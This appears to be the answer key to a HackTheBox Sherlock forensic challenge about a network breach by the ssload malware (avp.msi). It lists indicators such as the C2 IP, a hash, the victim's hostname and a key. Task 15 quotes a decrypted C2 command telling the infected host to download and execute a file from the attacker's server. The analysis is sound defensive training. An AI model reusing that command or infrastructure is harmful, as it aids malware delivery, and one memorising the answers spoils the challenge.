

----


#### Sherlock Scenario

A recent anomaly has been detected in our network traffic, suggesting a potential breach. Our team suspects that an unauthorized entity has infiltrated our systems and accessed confidential company data. Your mission is to unravel this mystery, understand the breach, and determine the extent of the compromised data.


----


Task 1

What IP address did the original suspicious traffic come from?

10.4.17.101



Task 2

The attacker downloaded a suspicious file. What is the HTTP method used to retrieve the properties of this file?

PROPFIND



Task 3

It appears that this file is malware. What is its filename?
avp.msi


Task 4

What is the SSDEEP hash of the malware as reported by VirusTotal?
24576:BqKxnNTYUx0ECIgYmfLVYeBZr7A9zdfoAX+8UhxcS:Bq6TYCZKumZr7ARdAAO8oxz


Task 5

According to the NeikiAnalytics community comment on VirusTotal, to which family does the malware belong?
ssload


Task 6

What is the creation time of the malware?
2009-12-11 11:47:44



Task 7

What is the domain name that the malware is trying to connect with?
api.ipify.org




Task 8

What is the IP address that the attacker has consistently used for communication?
85.239.53.219


Task 9

Which file, included in the original package, is extracted and utilized by the malware during execution?
forcedelctl.dll



Task 10

What program is used to execute the malware?
msiexec.exe




Task 11

What is the hostname of the compromised machine?
DESKTOP-FWQ3U4C



Task 12

What is the key that was used in the attack?
WkZPxBoH6CA3Ok4iI



Task 13

What is the os_version of the compromised machine?
Windows 6.3.9600




Task 14

What is the owner name of the compromised machine?
Nevada




Task 15

After decrypting the communication from the malware, what command is revealed to be sent to the C2 server?
{"command": "exe", "args": ["http://85.239.53.219/download?id=Nevada&module=2&filename=None"]}


